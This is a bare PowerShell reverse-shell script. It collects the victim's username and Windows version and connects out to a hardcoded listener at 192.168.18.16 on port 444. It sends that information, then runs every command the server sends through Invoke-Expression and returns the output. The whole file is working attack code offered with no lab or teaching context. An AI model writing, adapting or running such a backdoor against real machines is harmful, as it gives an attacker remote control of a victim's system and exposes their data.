# fetch victim information
$os_info = "client_name: $env:USERNAME <-> client_os: $(Get-CimInstance Win32_OperatingSystem | select Caption).Caption"

# Lhost and lport
$lhost = '192.168.18.16'
$lport = 444

# create socket and connect to the server
try {
    $client = New-Object System.Net.Sockets.TcpClient($lhost, $lport)
}
catch {
    Write-Error "Failed to connect to the server: $_"
    exit
}

# send the OS information to the server
try {
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.WriteLine($os_info)
    $writer.Flush()
}
catch {
    Write-Error "Failed to send OS info to the server: $_"
    $client.Close()
    exit
}

# receive commands from the server and execute them
try {
    $reader = New-Object System.IO.StreamReader($stream)
    while ($true) {
        $command = $reader.ReadLine()
        if ($command -eq "exit") {
            break
        }
        try {
            $output = Invoke-Expression $command
            if ([string]::IsNullOrWhiteSpace($output)) {
                $output = "----"
            }
            $writer.WriteLine($output)
            $writer.Flush()
        }
        catch {
            $writer.WriteLine("Error executing command: $_")
            $writer.Flush()
        }
    }
}
catch {
    Write-Error "Failed to receive and execute commands: $_"
}

$client.Close()

